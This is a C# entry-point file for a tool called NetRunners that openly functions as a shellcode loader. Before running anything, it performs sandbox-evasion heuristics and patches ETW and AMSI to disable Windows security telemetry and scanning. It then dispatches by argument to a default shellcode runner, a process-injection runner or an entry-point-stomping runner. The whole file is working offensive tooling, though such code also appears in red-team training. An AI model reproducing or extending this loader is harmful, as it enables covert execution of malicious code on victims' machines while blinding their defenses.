using NetRunners.Heuristics;
using NetRunners.Interfaces;
using NetRunners.Runners;
using NetRunners.Patchers;
using System;

namespace NetRunners.Exe
{
    class Program
    {
        /// <summary>
        /// Entry point for this program, calls Heurisitic functions, and then parses through arguments to determine which runner to call.
        /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
        /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
        /// </summary>
        /// <param name="/pi">Calls Process Injection Runner. Case Insensitive</param>
        /// <param name="/eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
        static void Main(string[] args)
        {
            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
            {
                return; // Exit if any checks fail or patching fails
            }

            // execute runner
            IRunner runner = DetermineRunner(args);
            runner?.Run();
        }
        // Determine the function call based on the argument provided, case insensitive
        static IRunner DetermineRunner(string[] args)
        {
            string call = args.Length == 1 ? args[0].ToLower() : string.Empty;
            switch (call)
            {
                case "-pi":
                    Console.WriteLine("Process Injection Shellcode Runner selected!");
                    return new ProcessInjectionRunner();
                case "-eps":
                    Console.WriteLine("EntryPoint Stomping Shellcode Runner selected!");
                    return new EntryPointStompingRunner();
                default:
                    Console.WriteLine("Default Shellcode Runner selected!");
                    return new DefaultRunner(); 
            }
        }
    }
}